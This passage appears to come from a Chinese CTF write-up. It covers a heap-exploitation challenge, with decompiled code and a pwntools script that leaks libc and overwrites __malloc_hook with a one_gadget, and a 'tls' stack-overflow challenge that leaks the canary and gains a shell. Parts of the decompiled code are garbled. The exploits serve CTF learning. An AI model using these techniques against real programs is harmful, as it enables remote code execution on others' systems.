            {
              v8 = std::operator>(&std::cout, "Wrong idx");
              std::ostream::operator>);
            }
            continue;
          case 4uLL:                                // edit phone number
            std::operator>(&std::cout, "Please tell me idx:");
            idx = input_int();
            if ( idx >(&std::cout, "New Phone Number: ");
              std::istream::getline((std::istream *)&std::cin, *((char **)message_list[idx] + 3), 16LL);
            }
            else
            {
              v9 = std::operator>(&std::cout, "Wrong idx");
              std::ostream::operator>);
            }
            continue;
          case 5uLL:
            std::operator>(&std::cout, "Please tell me idx:");
            idx = input_int();
            if ( idx >(&std::cout, "Wrong idx");
              std::ostream::operator>);
            }
            continue;
          case 6uLL:
            std::operator>(&std::cout, "Please tell me idx:");
            idx = input_int();
            if ( idx >(&std::cout, "[");
              v16 = std::ostream::operator>(v16, "]");
              v18 = std::ostream::operator>);
              v19 = std::operator>(v18, "Message: ");
              v20 = std::operator>(v19, msg);
              v21 = std::ostream::operator>);
              v22 = std::operator>(v21, "Phone Number: ");
              v23 = std::operator>(v22, pho_num);
              v24 = std::ostream::operator>);
              v25 = std::operator>(v24, "Time: ");
              v11 = std::operator>(v25, time);
            }
            else
            {
              v11 = std::operator>(&std::cout, "Wrong idx");
            }
            std::ostream::operator>);
            continue;
          case 7uLL:
            v26 = std::operator>(&std::cout, "Shutdown!");
            std::ostream::operator>);
            exit(0);
            return;
          default:
            v27 = std::operator>(&std::cout, "Wrong Command!");
            std::ostream::operator>);
            continue;
        }
        while ( 1 )
        {
          if ( v28 > 4 )
            goto LABEL_8;
          if ( !message_list[v28] )
            break;
          idx = -1LL;
          ++v28;
        }
        idx = v28;
    LABEL_8:
        if ( idx == -1LL )
        {
          v3 = std::operator>(&std::cout, "Full!");
          std::ostream::operator>);
        }
        else
        {
          message_list[idx] = malloc(0x20uLL);
          printf("addr: 0x%x\n", (unsigned __int64)message_list[idx] & 0xFFF);
          std::operator>(&std::cout, "Please tell me time: ");
          std::istream::getline((std::istream *)&std::cin, (char *)message_list[idx] + 8, 8LL);
          std::operator>(&std::cout, "Please tell me phone number: ");
          v4 = message_list[idx];
          v4[3] = malloc(0x18uLL);
          std::istream::getline((std::istream *)&std::cin, *((char **)message_list[idx] + 3), 16LL);
          std::operator>(&std::cout, "Please tell me message's size: ");
          size = input_int();
          if ( size > 0x3F && size >(&std::cout, "Please tell me message: ");
            std::istream::getline((std::istream *)&std::cin, *((char **)message_list[idx] + 2), size);
          }
          else
          {
            v5 = std::operator>(&std::cout, "You can't use this size!");
            std::ostream::operator>);
          }
        }
      }
    }
题目定义了一个Message结构体，结构如下：
    struct message
    {
      size_t size;
      char time[8];
      char *message_addr;
      char *phone_number_addr;
    };
功能主要分为三大类：
  * 添加Message 
    * malloc一个message的结构体并存入list列表
    * 0x3f  0x3F and size <= 0x78:
            r.recvuntil("addr: 0x")
            msg_addr = int(r.recvuntil("\n"),16)
            r.sendlineafter("Please tell me message:",msg)
        return addr,msg_addr
    def edit_msg(idx,msg):
        cmd(2)
        r.sendlineafter("Please tell me idx:",str(idx))
        r.sendlineafter("New Message:",msg)
    def edit_time(idx,time):
        cmd(3)
        r.sendlineafter("Please tell me idx:",str(idx))
        r.sendlineafter("New Time:",time)
    def edit_phone_number(idx,phone_number):
        cmd(4)
        r.sendlineafter("Please tell me idx:",str(idx))
        r.sendlineafter("New Phone Number:",phone_number)  
    def free(idx):
        cmd(5)
        r.sendlineafter("Please tell me idx:",str(idx))
    def show(idx):
        cmd(6)
        r.sendlineafter("Please tell me idx:",str(idx))
    def debug(cmd = ""):
        gdb.attach(r,cmd)
    r = process("./Message")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elf = ELF("./Message")
    addr,msg_addr = add("0","0",0x60,"0") # 0
    addr,msg_addr = add("1","1",0x60,"1") # 1
    addr,msg_addr = add("\x71","\x71",0x60,"a" * 0x30) # 2
    addr,msg_addr = add("3","3",0x60,"\x71" * 9) # 3
    free(1)
    free(0)
    add("0","0",0x10,"0") # 0
    show(0)
    r.recvuntil("Message: ")
    heap_base = u64(r.recvuntil("\n",drop = True).ljust(8,"\x00")) - 0x11d20
    success("heap_base : " + hex(heap_base))
    payload = "\x71"*0x8 + p64(0x71) + p64(heap_base + 0x11c70)
    edit_msg(2,payload)
    target_heap = heap_base + 0x11df0
    edit_msg(0,p64(target_heap))
    addr,msg_addr = add("1","1",0x60,"1") # 1
    addr,msg_addr = add("4","4",0x60,"4") # 4
    edit_msg(2,"\xb1"*0x9)
    free(4)
    add("4","4",0x10,"4") # 4
    show(4)
    r.recvuntil("Message: ")
    libc_base = u64(r.recvuntil("\n",drop = True).ljust(8,"\x00")) - 0x3c4b78
    success("libc_base : " + hex(libc_base))
    malloc_hook = libc_base + libc.sym["__malloc_hook"]
    one_gadget = libc_base + 0x4527a
    payload = "\x71"*0x8 + p64(0x71) + p64(malloc_hook-0x23)
    edit_msg(0,payload)
    free(1)
    add("1","1",0x50,"1") # 1
    free(1)
    add("1","1",0x60,"1") # 1
    free(2)
    free(1)
    edit_msg(0,p64(malloc_hook-0x23))
    add("1","1",0x60,"1") # 1
    add("2","2",0x60,'1'*0xb+p64(one_gadget)*2) # 2
    free(1)
    cmd(1)
    #debug()
    r.interactive()
## PWN3——tls
###  程序分析
这是一到栈溢出的题。在`start_routine`中在循环结束后会做如下的操作`read(0, &buf,
0x100uLL);`，会造成栈溢出。由于程序开启了canary的保护，所以要泄漏canary。
程序会在栈上维护一个`__int64 v20[48]; // [rsp+40h] [rbp-1C0h]`的数组，同时会有一个数组的长度`unsigned
__int64 n; // [rsp+20h] [rbp-1E0h]`，还有和`__int64 sum; // [rsp+38h]
[rbp-1C8h]`。程序的表单总共有四个功能：
  1. 指定一个数组的位置`pos`
  2. 改变`v[pos]`中的内容， **有且仅有3次机会**
  3. 将数组中所有的内容（前`n`个）加到`sum`上
  4. 退出循环
###  利用思路
由于未对设置的pos做任何检查所以可以实现在栈上的任意写。由于数组的长度`n`在栈上，利用任意写可以任意改变n的值。利用求和操作我们可以变相的泄漏栈上的地址。要完成getshell就要拿到canary和libc的地址，在调试程序的过程我们发现在`canary-8`的位置有一个地址和libc的偏移是固定的。
  1. 将n设置为`0x1b8//8`，然后求和输出`sum`为`t`，利用`t`和libc的固定偏移算出libc。
  2. 将`v[0x1b8//8-1]`位置(`canary-8`)设置为0
  3. 将n设置为`0x1c0//8`，求和sum，利用`canary=sum-t`（`sum`是不清空的）
利用最后buf溢出的漏洞改写ret为gadget获得shell。
###  EXP
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']
    local = 1
    if local == 1:
        p = process("./tls")
        gads = [0xf1207]
        lb = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
        p=remote("",00)
        gads = [0xf1147]
        lb = ELF("libc.so.6")
    def ch(idx):
        p.sendlineafter("Your choice: ", '1')
        p.sendlineafter("Please input pos: ", str(idx))
    def edit(num):
        p.sendlineafter("Your choice: ", '2')
        p.sendlineafter("Please input new number: ", str(num))
    def sm():
        p.sendlineafter("Your choice: ", '3')
    def ex():
        p.sendlineafter("Your choice: ", '4')
    p.sendlineafter("How many? ", str(0x30))
    # pause()
    for i in range(0x30):
        p.sendline('0')
    ch(-4)
    edit(0x1b8//8)
    sm()
    p.recvuntil("result = ")
    t = int(p.recvuntil('\n'))
    libc = t + 0x51f900
    print("libc:", hex(libc))
    gdb.attach(p)
    ch(0x1b8//8-1)
    edit(0)
    ch(-4)
    edit(0x1c0//8)
    # ch(0x1c0//8-1)
    # edit(0)
    sm()
    p.recvuntil("result = ")
    can = int(p.recvuntil('\n'))
    if can < 0:
        can = can+(1 << 64)
    can-=t
    print("can:", hex(can))
    # pause()
    gdb.attach(p)
    ex();
    gadget = libc+gads[0]
    p.recvuntil("Oh!What is your name? ")
    pay=0x38*b'a'+p64(can)+p64(gadget)*2
    p.send(pay)
    p.interactive()